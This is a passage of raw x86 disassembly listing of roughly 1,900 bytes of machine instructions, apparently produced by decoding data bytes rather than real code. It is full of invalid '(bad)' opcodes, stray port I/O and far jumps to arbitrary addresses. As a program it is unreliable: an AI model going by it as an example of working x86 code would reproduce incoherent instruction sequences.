  41e687:	scas   al,BYTE PTR es:[edi]
  41e688:	stc    
  41e689:	pushf  
  41e68a:	or     eax,0xfb99e625
  41e68f:	cmp    al,0xee
  41e691:	mov    al,ds:0xcef2e7c4
  41e696:	adc    al,0xb6
  41e698:	lods   eax,DWORD PTR ds:[esi]
  41e699:	xchg   edx,eax
  41e69a:	(bad)  
  41e69b:	iret   
  41e69c:	loopne 0x41e63c
  41e69e:	mov    dl,0xf4
  41e6a0:	popf   
  41e6a1:	or     al,bh
  41e6a3:	in     al,dx
  41e6a4:	jns    0x41e63e
  41e6a6:	push   edx
  41e6a7:	cmp    BYTE PTR [eax+ebp*2-0x212afce0],ch
  41e6ae:	mov    cl,0xf3
  41e6b0:	jne    0x41e642
  41e6b2:	(bad)  
  41e6b3:	mov    al,ds:0xba6d3b03
  41e6b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b9:	inc    eax
  41e6ba:	inc    ebp
  41e6bb:	xor    ebx,DWORD PTR [esi+0x13c6291e]
  41e6c1:	mov    edx,0xd9f3fef1
  41e6c6:	push   esp
  41e6c7:	xchg   esi,eax
  41e6c8:	pusha  
  41e6c9:	jbe    0x41e678
  41e6cb:	popf   
  41e6cc:	add    al,0x8c
  41e6ce:	pusha  
  41e6cf:	mov    cl,0x51
  41e6d1:	jb     0x41e6ac
  41e6d3:	aad    0x98
  41e6d5:	mov    edx,0x8c76a8c
  41e6da:	dec    ebp
  41e6db:	popf   
  41e6dc:	out    0xfb,al
  41e6de:	push   edx
  41e6df:	enter  0xd010,0xfb
  41e6e3:	inc    ebx
  41e6e4:	sbb    al,0x5c
  41e6e6:	in     al,0xaf
  41e6e8:	mov    edx,0xb57a27e2
  41e6ed:	cld    
  41e6ee:	add    BYTE PTR [ebx-0x23bd3294],bl
  41e6f4:	xor    cl,BYTE PTR [esp+ebp*8-0x24f4794b]
  41e6fb:	cld    
  41e6fc:	jge    0x41e6aa
  41e6fe:	xor    al,0xec
  41e700:	push   ecx
  41e701:	aad    0x85
  41e703:	jmp    0xf011:0x55b78d4a
  41e70a:	call   0x72560cd4
  41e70f:	jmp    0x41e789
  41e711:	dec    ebx
  41e712:	call   0xff543d52
  41e717:	push   ebp
  41e718:	mov    ch,0xa0
  41e71a:	mov    ebx,0x5a61d2a
  41e71f:	stos   DWORD PTR es:[edi],eax
  41e720:	mov    cl,0xb4
  41e722:	push   ebp
  41e723:	not    DWORD PTR [edx-0x15]
  41e726:	inc    esp
  41e727:	sub    bl,BYTE PTR [edi]
  41e729:	aad    0x3a
  41e72b:	call   0x51c4:0x388baa34
  41e732:	mov    eax,0xcabea91
  41e737:	mov    ecx,0xe0a2b1a7
  41e73c:	and    DWORD PTR [edi],ebx
  41e73e:	ss stos DWORD PTR es:[edi],eax
  41e740:	push   esp
  41e741:	adc    al,0x18
  41e743:	fld    DWORD PTR [edi+0x5af7c7d9]
  41e749:	repz add BYTE PTR [edx-0xa9bca96],cl
  41e750:	shr    BYTE PTR [esi+0x9541da0],cl
  41e756:	mov    WORD PTR [edi],gs
  41e758:	frstor [esi]
  41e75a:	outs   dx,DWORD PTR ds:[esi]
  41e75b:	dec    esp
  41e75c:	add    eax,0xa25f6aa4
  41e761:	ja     0x41e729
  41e763:	(bad)  
  41e764:	push   ebp
  41e765:	jnp    0x41e763
  41e767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e768:	scas   al,BYTE PTR es:[edi]
  41e769:	sbb    al,0x2a
  41e76b:	dec    ebp
  41e76c:	es hlt 
  41e76e:	call   0xa4d4:0x6fc54bfd
  41e775:	(bad)  
  41e776:	jmp    0x2eeb:0x7dc88b37
  41e77d:	iret   
  41e77e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e77f:	xchg   edi,eax
  41e780:	sbb    eax,0xc0cb498d
  41e785:	push   0x7b
  41e787:	inc    esp
  41e788:	or     BYTE PTR [ecx+0x9],bl
  41e78b:	lds    ebx,FWORD PTR [ebx-0x334f84d3]
  41e791:	inc    edx
  41e792:	int    0xe
  41e794:	in     al,dx
  41e795:	(bad)  
  41e796:	push   edx
  41e797:	cmc    
  41e798:	inc    esi
  41e799:	pandn  mm0,QWORD PTR [edx+ebp*2-0x4abbb3fd]
  41e7a1:	into   
  41e7a2:	xor    eax,0xd546d160
  41e7a7:	sbb    ebp,DWORD PTR [ebp-0x57]
  41e7aa:	xchg   edi,eax
  41e7ab:	imul   ebp,edi,0x8fe44a9
  41e7b1:	inc    edi
  41e7b2:	out    0xd2,eax
  41e7b4:	jmp    0x41e788
  41e7b6:	add    al,0x19
  41e7b8:	out    0x6f,eax
  41e7ba:	je     0x41e813
  41e7bc:	xlat   BYTE PTR ds:[ebx]
  41e7bd:	shl    DWORD PTR [edi+0x5f3072c1],1
  41e7c3:	xor    esi,DWORD PTR [ecx+0x27]
  41e7c6:	mov    ah,0x35
  41e7c8:	test   al,0xec
  41e7ca:	sub    cl,BYTE PTR [ebx]
  41e7cc:	lock fdivr QWORD PTR [ebp-0x38]
  41e7d0:	xchg   edx,eax
  41e7d1:	dec    eax
  41e7d2:	shr    BYTE PTR [ebp-0x71],1
  41e7d5:	fbld   TBYTE PTR [ebx-0x200dabb2]
  41e7db:	jmp    0xf9e316b1
  41e7e0:	inc    ebp
  41e7e1:	pushf  
  41e7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7e3:	aas    
  41e7e4:	mov    edi,0x74857634
  41e7e9:	fdiv   DWORD PTR [eax-0x19]
  41e7ec:	sbb    ah,BYTE PTR [edx+ebx*2-0x4a]
  41e7f0:	push   ds
  41e7f1:	in     al,0x76
  41e7f3:	ins    DWORD PTR es:[edi],dx
  41e7f4:	mov    BYTE PTR [eax+0x70fde658],ah
  41e7fa:	and    eax,0xb85aed4d
  41e7ff:	inc    ebx
  41e800:	cmp    al,0x49
  41e802:	xor    edx,DWORD PTR [ebx+0x57]
  41e805:	xchg   esi,eax
  41e806:	pop    eax
  41e807:	repz add al,0x2a
  41e80a:	repz (bad) 
  41e80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e80d:	cdq    
  41e80e:	(bad)  
  41e80f:	cmc    
  41e810:	scas   eax,DWORD PTR es:[edi]
  41e811:	mov    dh,0xf3
  41e813:	sbb    DWORD PTR [esi+0x53228e22],edx
  41e819:	jne    0x41e7b6
  41e81b:	cmp    ch,BYTE PTR [edx+0x20850312]
  41e821:	adc    ebx,DWORD PTR [ebp-0x1258b312]
  41e827:	push   cs
  41e828:	dec    ebx
  41e829:	inc    ebp
  41e82a:	mov    ch,0xcf
  41e82c:	sub    eax,0x95663d86
  41e831:	popa   
  41e832:	mov    bl,bl
  41e834:	gs mov cl,0x5c
  41e837:	push   ebp
  41e838:	mov    cl,0x77
  41e83a:	push   ds
  41e83b:	sub    BYTE PTR [ebp+0x4409e40e],0x4b
  41e842:	mov    BYTE PTR [ecx+ecx*2-0xa],bh
  41e846:	inc    edx
  41e847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e848:	jb     0x41e7e1
  41e84a:	(bad)  
  41e84b:	and    ebp,DWORD PTR [ebx-0xc]
  41e84e:	fdivr  st,st(2)
  41e850:	jp     0x41e8c2
  41e852:	lds    ebx,FWORD PTR [esi]
  41e854:	mov    eax,edi
  41e856:	lods   eax,DWORD PTR ds:[esi]
  41e857:	stos   DWORD PTR es:[edi],eax
  41e858:	pop    ebp
  41e859:	xor    esp,DWORD PTR [esi-0x791cfe8a]
  41e85f:	mov    eax,0xafe4b066
  41e864:	(bad)  
  41e865:	call   0xff55:0x1c310100
  41e86c:	(bad)  
  41e86d:	adc    ch,al
  41e86f:	adc    al,0xe1
  41e871:	push   esi
  41e872:	xchg   esi,eax
  41e873:	push   ss
  41e874:	xlat   BYTE PTR ds:[ebx]
  41e875:	push   ss
  41e876:	and    BYTE PTR [ebx+edi*4+0x21],dh
  41e87a:	fisttp WORD PTR [edi+0xa9cc972]
  41e880:	sub    ch,BYTE PTR [ebx+0x6e]
  41e883:	dec    edi
  41e884:	pop    ecx
  41e885:	pop    ds
  41e886:	icebp  
  41e887:	ret    
  41e888:	(bad)  
  41e889:	jmp    0xda943ba7
  41e88e:	mov    ebp,0x9d079875
  41e893:	das    
  41e894:	jns    0x41e87a
  41e896:	and    eax,DWORD PTR [esi]
  41e898:	sbb    DWORD PTR ds:0x94fcd53d,ebx
  41e89e:	fcomip st,st(0)
  41e8a0:	scas   al,BYTE PTR es:[edi]
  41e8a1:	adc    ebp,DWORD PTR [eax]
  41e8a3:	sahf   
  41e8a4:	div    BYTE PTR [edx]
  41e8a6:	mov    ch,0x7e
  41e8a8:	sbb    DWORD PTR [edi+0x60],eax
  41e8ab:	mov    al,ds:0x6266b236
  41e8b0:	je     0x41e8f5
  41e8b2:	fnsave [edi-0x3f4e87e1]
  41e8b8:	jbe    0x41e8fa
  41e8ba:	repz pop esp
  41e8bc:	dec    esi
  41e8bd:	mov    cl,0x4b
  41e8bf:	pop    ds
  41e8c0:	in     eax,0xb5
  41e8c2:	mov    DWORD PTR [ebp+eiz*4+0x2d],edx
  41e8c6:	adc    al,0xaa
  41e8c8:	or     esp,DWORD PTR [edx-0x74b3571d]
  41e8ce:	mul    ch
  41e8d0:	mul    bl
  41e8d2:	jmp    0xa59ed5a
  41e8d7:	retf   0xd326
  41e8da:	push   ss
  41e8db:	ins    DWORD PTR es:[edi],dx
  41e8dc:	add    ebx,DWORD PTR [ebp+edi*4-0x14]
  41e8e0:	xchg   edx,eax
  41e8e1:	xor    al,0x49
  41e8e3:	mov    WORD PTR [esi],es
  41e8e5:	mov    esi,0xc488b9fd
  41e8ea:	clc    
  41e8eb:	test   eax,0x18b42e59
  41e8f0:	mov    ah,0xb4
  41e8f2:	imul   esp,DWORD PTR [ecx+ebp*4],0x62b03ee0
  41e8f9:	les    ebx,FWORD PTR [ebp*2+0x4108893d]
  41e900:	jecxz  0x41e97c
  41e902:	cmp    edx,ebx
  41e904:	pop    edi
  41e905:	js     0x41e8d6
  41e907:	into   
  41e908:	outs   dx,BYTE PTR ds:[esi]
  41e909:	fmul   st,st(2)
  41e90b:	ins    DWORD PTR es:[edi],dx
  41e90c:	push   ebx
  41e90d:	test   eax,0x1d549195
  41e912:	jns    0x41e905
  41e914:	aam    0x7e
  41e916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e918:	push   ss
  41e919:	fild   WORD PTR [ecx]
  41e91b:	pop    ecx
  41e91c:	popa   
  41e91d:	mov    DWORD PTR [esi-0x4904ed32],edx
  41e923:	dec    ecx
  41e924:	xor    edx,DWORD PTR [ecx-0x61]
  41e927:	mov    WORD PTR [edx-0x71],gs
  41e92a:	imul   edi,DWORD PTR [ebp+0x4e],0xc948a4c0
  41e931:	sub    al,0x6a
  41e933:	mov    dh,0x67
  41e935:	pop    edx
  41e936:	pop    esi
  41e937:	in     eax,0xb2
  41e939:	xchg   ecx,eax
  41e93a:	ss sub eax,0xa1c7c103
  41e940:	daa    
  41e941:	in     eax,dx
  41e942:	out    0x95,eax
  41e944:	out    0x18,al
  41e946:	cmp    al,0x51
  41e948:	das    
  41e949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e94a:	sub    al,0x8d
  41e94c:	out    dx,al
  41e94d:	data16 aas 
  41e94f:	adc    al,0x3c
  41e951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e952:	xor    edi,DWORD PTR [esi]
  41e954:	jecxz  0x41e8e1
  41e956:	inc    esi
  41e957:	icebp  
  41e958:	jns    0x41e91a
  41e95a:	mov    WORD PTR [edx+edi*1+0x1a],?
  41e95e:	mov    eax,ds:0xdedad5d9
  41e963:	jle    0x41e9d1
  41e965:	fist   DWORD PTR ds:0x36c9d272
  41e96c:	mov    WORD PTR [esi-0x2d],?
  41e96f:	arpl   bx,bp
  41e971:	mov    dl,0x24
  41e973:	push   es
  41e974:	int    0x59
  41e976:	mov    eax,ds:0x278a2fdd
  41e97b:	pop    edx
  41e97c:	xchg   esi,eax
  41e97d:	jmp    0xd896:0x37ece8a
  41e984:	jl     0x41e92a
  41e986:	mov    ebx,0xb016cf45
  41e98b:	int3   
  41e98c:	xchg   ebx,eax
  41e98d:	retf   0x1657
  41e990:	outs   dx,BYTE PTR ds:[esi]
  41e991:	out    0x72,eax
  41e993:	in     eax,dx
  41e994:	dec    ebp
  41e995:	push   eax
  41e996:	inc    esi
  41e997:	or     eax,0xb30bf391
  41e99c:	cmp    BYTE PTR [ebp+0x46f24971],dl
  41e9a2:	aaa    
  41e9a3:	es push ecx
  41e9a5:	div    BYTE PTR [ecx]
  41e9a7:	pop    ss
  41e9a8:	xor    BYTE PTR [ebp-0x3e83d07d],cl
  41e9ae:	and    al,0xba
  41e9b0:	adc    BYTE PTR [edx+0x3a],al
  41e9b3:	into   
  41e9b4:	pop    ebx
  41e9b5:	cwde   
  41e9b6:	enter  0xe013,0x2c
  41e9ba:	dec    esi
  41e9bb:	xchg   DWORD PTR [esi],ebx
  41e9bd:	test   eax,0x39952e17
  41e9c2:	inc    edi
  41e9c3:	in     al,0x2d
  41e9c5:	mov    eax,ds:0x6764a8b7
  41e9ca:	cmp    ah,bh
  41e9cc:	or     BYTE PTR [ecx+0x6d4b32d0],dh
  41e9d2:	icebp  
  41e9d3:	push   0x2616b066
  41e9d8:	enter  0xf0d0,0x44
  41e9dc:	jle    0x41ea08
  41e9de:	dec    eax
  41e9df:	bound  esi,QWORD PTR [edi+0x24a427b]
  41e9e5:	cdq    
  41e9e6:	push   ss
  41e9e7:	dec    eax
  41e9e8:	xor    eax,0x56a02f68
  41e9ed:	cdq    
  41e9ee:	loopne 0x41e974
  41e9f0:	sbb    al,bh
  41e9f2:	adc    eax,0x4ef32372
  41e9f7:	or     eax,0xa518440a
  41e9fc:	scas   eax,DWORD PTR es:[edi]
  41e9fd:	out    dx,al
  41e9fe:	ja     0x41e9ca
  41ea00:	out    0x21,al
  41ea02:	jb     0x41e9b8
  41ea04:	ret    
  41ea05:	mov    ah,0x27
  41ea07:	and    bl,BYTE PTR [ecx+0x73]
  41ea0a:	int    0x80
  41ea0c:	popf   
  41ea0d:	pop    ecx
  41ea0e:	sbb    DWORD PTR [esi+0x6dfa37d1],edi
  41ea14:	jno    0x41ea52
  41ea16:	mov    esp,0xf1a7b09c
  41ea1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea1c:	(bad)  
  41ea1d:	fimul  DWORD PTR [ecx+0x2bb4dc83]
  41ea23:	jnp    0x41ea77
  41ea25:	hlt    
  41ea26:	xchg   DWORD PTR [ecx+0x56],esp
  41ea29:	cmovae esi,DWORD PTR [esi+edx*8-0x4220623d]
  41ea31:	rcr    edi,0x12
  41ea34:	stos   DWORD PTR es:[edi],eax
  41ea35:	loope  0x41ea8a
  41ea37:	push   DWORD PTR [ebx-0x2876f881]
  41ea3d:	shr    BYTE PTR [edx],0x8
  41ea40:	jg     0x41ea0c
  41ea42:	lods   eax,DWORD PTR ds:[esi]
  41ea43:	sbb    DWORD PTR [eax],eax
  41ea45:	xchg   BYTE PTR [ebp-0x577cd2c3],bl
  41ea4b:	push   ss
  41ea4c:	push   esp
  41ea4d:	mov    ds:0x7ca5d7b2,eax
  41ea52:	cs xchg esp,eax
  41ea54:	adc    eax,0xd0520ab6
  41ea59:	push   DWORD PTR [ebp-0x12]
  41ea5c:	cmc    
  41ea5d:	mov    esp,0x2d4bbd01
  41ea62:	mov    gs,eax
  41ea64:	ficom  WORD PTR [ebp-0x4811ab43]
  41ea6a:	clc    
  41ea6b:	out    0x28,al
  41ea6d:	push   edi
  41ea6e:	xor    BYTE PTR [ecx-0x654bcaa8],bh
  41ea74:	(bad)  
  41ea75:	test   al,0x62
  41ea77:	js     0x41eaaa
  41ea79:	add    edi,esi
  41ea7b:	mov    al,0xe2
  41ea7d:	or     bl,dl
  41ea7f:	sub    edx,DWORD PTR [ebp-0x77]
  41ea82:	adc    eax,0xda303569
  41ea87:	into   
  41ea88:	cli    
  41ea89:	fsubr  DWORD PTR [edi+0x4c]
  41ea8c:	addr16 dec esi
  41ea8e:	jg     0x41ea3b
  41ea90:	lods   al,BYTE PTR ds:[esi]
  41ea91:	mov    cl,ch
  41ea93:	outs   dx,BYTE PTR ds:[esi]
  41ea94:	mov    eax,0xd971b6a0
  41ea99:	push   ebp
  41ea9a:	in     al,dx
  41ea9b:	ret    0xb026
  41ea9e:	(bad)  
  41ea9f:	out    dx,al
  41eaa0:	jnp    0x41eaf3
  41eaa2:	xchg   ebp,eax
  41eaa3:	jo     0x41eb0a
  41eaa5:	xor    al,0xa8
  41eaa7:	xor    al,0x2f
  41eaa9:	push   esi
  41eaab:	pop    ds
  41eaac:	jo     0x41ea67
  41eaae:	(bad)  
  41eaaf:	adc    BYTE PTR [ecx-0x77064778],cl
  41eab5:	xchg   edx,eax
  41eab6:	push   edx
  41eab7:	imul   edx,DWORD PTR [eax+0x43],0xffffffe7
  41eabb:	jbe    0x41eb05
  41eabd:	stc    
  41eabe:	lahf   
  41eabf:	sub    dl,BYTE PTR [esi+edi*2]
  41eac2:	push   edx
  41eac3:	cmp    bl,ah
  41eac5:	test   al,0x92
  41eac7:	imul   esp,DWORD PTR [edx+0x66f2f8c7],0xf513aae0
  41ead1:	jl     0x41eb36
  41ead3:	pop    esp
  41ead4:	xor    ecx,DWORD PTR [edx+0x301cb662]
  41eada:	adc    BYTE PTR ds:0x873bf102,dl
  41eae0:	lea    ebp,[ebx-0x65d197e6]
  41eae6:	mov    dl,0xd4
  41eae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eae9:	jmp    FWORD PTR [ecx+0x1c]
  41eaec:	or     DWORD PTR [eax-0x5f],ebx
  41eaef:	cmp    eax,0x733d4343
  41eaf4:	shr    DWORD PTR [eax-0x56],0x88
  41eaf8:	jl     0x41eb33
  41eafa:	xchg   ecx,eax
  41eafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eafc:	mov    bl,0x42
  41eafe:	shr    al,1
  41eb00:	dec    esp
  41eb01:	pop    ebx
  41eb02:	outs   dx,BYTE PTR ds:[esi]
  41eb03:	aas    
  41eb04:	mov    esp,0x994c2f88
  41eb09:	das    
  41eb0a:	or     eax,DWORD PTR [eax+0x1a94a332]
  41eb10:	jl     0x41eb10
  41eb12:	jmp    0x32ea:0x8482f8de
  41eb19:	call   0xb337:0x254af464
  41eb20:	xchg   DWORD PTR [eax+0x37],esi
  41eb23:	cmp    DWORD PTR [eax-0x80],esp
  41eb26:	jns    0x41eab9
  41eb28:	aad    0xa9
  41eb2a:	and    DWORD PTR [esi+eiz*8],ebp
  41eb2d:	fild   QWORD PTR [esi-0xa]
  41eb30:	inc    esi
  41eb31:	in     eax,dx
  41eb32:	test   al,0x99
  41eb34:	jle    0x41eb5b
  41eb36:	dec    edi
  41eb37:	pop    ebx
  41eb38:	jae    0x41eb0a
  41eb3a:	div    DWORD PTR [edi+0x4ceb8188]
  41eb40:	cli    
  41eb41:	adc    eax,0x86319d15
  41eb46:	out    0x70,eax
  41eb48:	popa   
  41eb49:	dec    ecx
  41eb4a:	add    DWORD PTR [edi-0x3a63b3db],0x9
  41eb51:	cmc    
  41eb52:	jge    0x41eaee
  41eb54:	push   es
  41eb55:	mov    al,0x73
  41eb57:	dec    ecx
  41eb58:	adc    BYTE PTR [ebx-0x40],ah
  41eb5b:	jmp    0x5915f85a
  41eb60:	adc    DWORD PTR [ecx-0xf],esp
  41eb63:	stos   BYTE PTR es:[edi],al
  41eb64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb65:	pop    ebx
  41eb66:	test   eax,0x7ff6f0c5
  41eb6b:	mov    ebp,0x5fd8f083
  41eb70:	mov    ecx,cr1
  41eb73:	test   al,0x9f
  41eb75:	lods   eax,DWORD PTR ds:[esi]
  41eb76:	in     eax,0xd5
  41eb78:	cmp    al,0x1c
  41eb7a:	es into 
  41eb7c:	push   esp
  41eb7d:	fild   WORD PTR [ebp+0x39024e9f]
  41eb83:	out    0x5b,eax
  41eb85:	sub    bl,ah
  41eb87:	jno    0x41ebd0
  41eb89:	dec    edx
  41eb8a:	push   esi
  41eb8b:	lods   al,BYTE PTR ds:[esi]
  41eb8c:	or     eax,0xe255a88e
  41eb91:	adc    al,0x59
  41eb93:	aas    
  41eb94:	sub    al,0x92
  41eb96:	aaa    
  41eb97:	sbb    bh,BYTE PTR gs:[ecx-0x55]
  41eb9b:	add    bh,BYTE PTR [ebx+0x3d3a480]
  41eba1:	xor    eax,0x48740abd
  41eba6:	int3   
  41eba7:	pop    ebp
  41eba8:	ffreep st(6)
  41ebaa:	stos   DWORD PTR es:[edi],eax
  41ebab:	adc    eax,0x41fd99f0
  41ebb0:	xchg   ecx,eax
  41ebb1:	dec    edx
  41ebb2:	in     al,dx
  41ebb3:	cmp    eax,DWORD PTR [edi-0x4f]
  41ebb6:	stos   DWORD PTR es:[edi],eax
  41ebb7:	or     edi,DWORD PTR [ecx+0x209cab3a]
  41ebbd:	ins    DWORD PTR es:[edi],dx
  41ebbe:	call   0xd44e:0xda8be6e
  41ebc5:	push   eax
  41ebc6:	dec    edx
  41ebc7:	dec    ebp
  41ebc8:	into   
  41ebc9:	rcl    DWORD PTR [esi-0x17],cl
  41ebcc:	stos   BYTE PTR es:[edi],al
  41ebcd:	loopne 0x41ec4e
  41ebcf:	push   ebx
  41ebd0:	div    BYTE PTR ds:0x4251f708
  41ebd6:	(bad)
  41ebd9:	and    cl,BYTE PTR [ebx]
  41ebdb:	and    BYTE PTR [eax+0xf36ab13],cl
  41ebe1:	popa   
  41ebe2:	mov    eax,ds:0xf8eac41a
  41ebe7:	arpl   WORD PTR [edx+0xa829fe0],di
  41ebed:	test   eax,0x216e5efa
  41ebf2:	dec    eax
  41ebf3:	xchg   esp,eax
  41ebf4:	pop    edx
  41ebf5:	mov    esp,eax
  41ebf7:	(bad)  
  41ebf8:	mov    ecx,0xd08e946a
  41ebfd:	out    dx,al
  41ebfe:	jmp    0x41ebda
  41ec00:	add    ch,cl
  41ec02:	popa   
  41ec03:	cmp    edi,esp
  41ec05:	mov    ecx,0xef6bacab
  41ec0a:	cmp    ebx,DWORD PTR [edi+eax*2-0x55]
  41ec0e:	dec    ecx
  41ec0f:	out    dx,al
  41ec10:	sbb    esi,ebp
  41ec12:	inc    edx
  41ec13:	(bad)  
  41ec14:	jmp    0x33d4ac79
  41ec19:	adc    al,0x3a
  41ec1b:	inc    ecx
  41ec1c:	in     al,0xce
  41ec1e:	pusha  
  41ec1f:	xlat   BYTE PTR ds:[ebx]
  41ec20:	fs xor al,0x6d
  41ec23:	fwait
  41ec24:	sub    edi,DWORD PTR [edx+0x66a39273]
  41ec2a:	shr    ah,1
  41ec2c:	add    al,0xc7
  41ec2e:	btc    DWORD PTR [ebp-0x64d1e390],ebp
  41ec35:	fs repnz push 0x65
  41ec39:	test   eax,0xf2d57dac
  41ec3e:	(bad)  
  41ec3f:	rcr    DWORD PTR [esi],cl
  41ec41:	popf   
  41ec42:	xchg   ecx,eax
  41ec43:	mov    ecx,0xf5920123
  41ec48:	pop    ss
  41ec49:	sub    al,0xfe
  41ec4b:	jmp    0x41ec78
  41ec4d:	inc    edx
  41ec4e:	and    DWORD PTR [edi+0x37],esp
  41ec51:	lods   al,BYTE PTR ds:[esi]
  41ec52:	sbb    al,0xe4
  41ec54:	xchg   ebx,eax
  41ec55:	cmp    DWORD PTR [ebx+0x64cd58a2],edx
  41ec5b:	in     eax,dx
  41ec5c:	add    eax,0x5b7d71f2
  41ec61:	mov    edi,?
  41ec63:	push   0x63
  41ec65:	lea    ebx,[esi-0x74]
  41ec68:	ret    
  41ec69:	mov    al,cl
  41ec6b:	sub    eax,0xa6f55212
  41ec70:	dec    ecx
  41ec71:	aas    
  41ec72:	mov    BYTE PTR [ebx+0x3a],bl
  41ec75:	test   al,0x46
  41ec77:	cmp    cl,BYTE PTR [eax-0xef652aa]
  41ec7d:	jno    0x41ec85
  41ec7f:	sbb    BYTE PTR [esi],0xbb
  41ec82:	ror    DWORD PTR [edx-0x1a7f3bd3],0xaf
  41ec89:	popa   
  41ec8a:	outs   dx,BYTE PTR ds:[esi]
  41ec8b:	pop    eax
  41ec8c:	repz mov esp,0xa51c1f17
  41ec92:	nop
  41ec93:	or     DWORD PTR [ecx-0xd],edx
  41ec96:	push   esp
  41ec97:	scas   al,BYTE PTR es:[edi]
  41ec98:	mov    edi,0xb73b0036
  41ec9d:	data16 add BYTE PTR [eax-0x35],cl
  41eca1:	or     ch,BYTE PTR [ecx]
  41eca3:	sbb    dl,BYTE PTR [esi]
  41eca5:	push   edi
  41eca6:	repz mov eax,ds:0xe3cb9280
  41ecac:	jmp    0xce018a87
  41ecb1:	les    edi,FWORD PTR [edx-0x38]
  41ecb4:	leave  
  41ecb5:	mov    cl,0x4b
  41ecb7:	arpl   WORD PTR [edi+0x5da25ebf],cx
  41ecbd:	cli    
  41ecbe:	jle    0x41ec89
  41ecc0:	push   DWORD PTR [edi]
  41ecc2:	and    eax,DWORD PTR [esi-0x46610343]
  41ecc8:	add    dh,bl
  41ecca:	in     eax,dx
  41eccb:	pop    es
  41eccc:	push   ds
  41eccd:	fs pop esp
  41eccf:	dec    ebp
  41ecd0:	inc    esp
  41ecd1:	xchg   BYTE PTR [edx+0x6c0a3c],dh
  41ecd7:	mov    ah,0x14
  41ecd9:	das    
  41ecda:	push   esp
  41ecdb:	jecxz  0x41ec72
  41ecdd:	jl     0x41ed1a
  41ecdf:	jo     0x41ed15
  41ece1:	out    0xe3,al
  41ece3:	sub    eax,0xd12155d4
  41ece8:	inc    ebx
  41ece9:	xlat   BYTE PTR ds:[ebx]
  41ecea:	sub    al,0x1a
  41ecec:	out    0xd6,eax
  41ecee:	cwde   
  41ecef:	jne    0x41ed0a
  41ecf1:	mov    dh,0x14
  41ecf3:	mov    ebx,0x27898ca8
  41ecf8:	imul   esp,DWORD PTR [esi+0x5769097],0x71d25001
  41ed02:	xor    ebp,ecx
  41ed04:	(bad)  
  41ed05:	fsubr  st,st(4)
  41ed07:	outs   dx,DWORD PTR ds:[esi]
  41ed08:	jecxz  0x41ecf8
  41ed0a:	out    dx,eax
  41ed0b:	stc    
  41ed0c:	sbb    BYTE PTR fs:[eax],bl
  41ed0f:	dec    eax
  41ed10:	xchg   esp,eax
  41ed11:	push   cs
  41ed12:	mov    edx,0x4755400
  41ed17:	mov    bh,0x7a
  41ed19:	(bad)  
  41ed1a:	pop    esi
  41ed1b:	and    ebx,eax
  41ed1d:	push   cs
  41ed1e:	sbb    BYTE PTR [ecx],dh
  41ed20:	test   BYTE PTR [eax+0x12],bl
  41ed23:	or     eax,0xecdd8973
  41ed28:	loope  0x41ecf4
  41ed2a:	stos   BYTE PTR es:[edi],al
  41ed2b:	ret    
  41ed2c:	das    
  41ed2d:	ja     0x41ecda
  41ed2f:	sti    
  41ed30:	sub    eax,0x9398d644
  41ed35:	mov    ecx,0x96a07fd7
  41ed3a:	int    0x41
  41ed3c:	push   0xba9ed65f
  41ed41:	inc    ecx
  41ed42:	mov    eax,0x5102a2a4
  41ed47:	fimul  WORD PTR [edi-0x4c]
  41ed4a:	scas   eax,DWORD PTR es:[edi]
  41ed4b:	adc    al,0xf2
  41ed4d:	sub    ch,BYTE PTR [esi-0x7c18c14e]
  41ed53:	pmulhuw mm2,QWORD PTR [ecx]
  41ed56:	dec    esp
  41ed57:	push   0xffffffe3
  41ed59:	ret    0xe842
  41ed5c:	mov    esp,0xc5cc7067
  41ed61:	mov    ebp,0x1a00f310
  41ed66:	push   ds
  41ed67:	mov    dl,0x65
  41ed69:	cdq    
  41ed6a:	or     bl,BYTE PTR [edx+ebp*1-0x5f]
  41ed6e:	push   esp
  41ed6f:	and    DWORD PTR [ecx+0x508a9b9f],0x18
  41ed76:	inc    esi
  41ed77:	ror    DWORD PTR [edx],cl
  41ed79:	jmp    0x2473725f
  41ed7e:	mov    WORD PTR [esi+edx*1+0x7ae91031],?
  41ed85:	cli    
  41ed86:	out    dx,eax
  41ed87:	sub    DWORD PTR [ecx-0x4bd6c62b],ecx
  41ed8d:	std    
  41ed8e:	and    al,0xa2
  41ed90:	cld    
  41ed91:	call   0x7181f3e3
  41ed96:	push   0x3a35b576
  41ed9b:	push   0xffffffa0
  41ed9d:	add    BYTE PTR [edi+0x3b],dh
  41eda0:	mov    esi,0xd5736167
  41eda5:	cli    
  41eda6:	lock cmp esp,DWORD PTR ss:[ebx+ecx*1+0x2d]
  41edac:	jnp    0x41ed2e
  41edae:	lea    ebx,cs:[esi+0x43f60e19]
  41edb5:	pop    ds
  41edb6:	and    DWORD PTR [eax+0x67],eax
  41edb9:	and    DWORD PTR [ebp-0x31],edx
  41edbc:	xchg   DWORD PTR [edi],esi
  41edbe:	push   ss
  41edbf:	or     al,0xc3
  41edc1:	dec    ebx
  41edc2:	aaa    
  41edc3:	mov    esp,0x2d566c92
  41edc8:	sub    eax,0x1620643e
  41edcd:	sti    
  41edce:	sbb    esi,DWORD PTR [edi-0x5c800103]
  41edd4:	cmp    DWORD PTR [edx+0x45343b30],esi
  41edda:	out    0x44,al
  41eddc:	in     eax,dx
  41eddd:	add    BYTE PTR [ecx-0x5d],dl
  41ede0:	lock pop ds
  41ede2:	pushf  
  41ede3:	jp     0x41edfd
  41ede5:	imul   ebp,ecx,0xfffffff4
  41ede8:	mov    gs,edi
  41edea:	int    0x59
  41edec:	test   eax,0x31a030f2
  41edf1:	clc    
  41edf2:	sub    bh,bl
  41edf4:	mov    bl,0x5a
